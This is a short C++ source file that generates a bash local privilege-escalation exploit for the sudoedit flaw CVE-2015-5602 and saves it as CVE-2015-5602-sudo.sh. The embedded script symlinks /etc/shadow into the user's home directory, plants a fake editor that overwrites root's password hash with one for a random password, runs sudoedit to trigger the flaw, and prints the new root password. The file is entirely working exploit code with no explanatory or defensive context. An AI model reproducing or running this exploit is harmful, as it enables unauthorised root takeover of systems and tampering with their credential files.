#include <iostream>
#include <fstream>
void sudoCVE(void)
{
	std::string payload =   "export EDITOR=\"/tmp/edit\""
                    	    "\nexport FOLDER=\"${RANDOM}\""
							"\nexport PASSWD=$(printf ${RANDOM} \\"
							"\n     | md5sum \\"
							"\n     | awk '{print $1}\')"




							"\nprepare()" 
							"{\n"
							"cat << EOF >> /tmp/edit\n"
							"#!/usr/bin/env bash\n"
							"pass=\"$(printf \"%q\" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))\"\n"
							"sed -i -e  \"s,^root:[^:]\\+:,root:\\${pass}:,\" \\${1}\n"
							"EOF\n"
							"}\n"

							"main()" 
							"{\n"
											
							    "mkdir -p /home/${USER}/${FOLDER}/\n"
											
								"ln -sf /etc/shadow /home/${USER}/${FOLDER}/esc.txt\n"
											
								"prepare && chmod +x ${EDITOR}\n"
											
								"sudoedit /home/${USER}/${FOLDER}/esc.txt\n"

                                "printf \"Change root Password to: ${PASSWD}\" \n"
										
							"}; main";
						
    
    std::cout << payload << std::endl;
	std::ofstream sudoExploit{"CVE-2015-5602-sudo.sh"};
	sudoExploit << payload;
	std::cout << "[+] Exploit Script Created: CVE-2015-5602-sudo.sh" << std::endl;


}
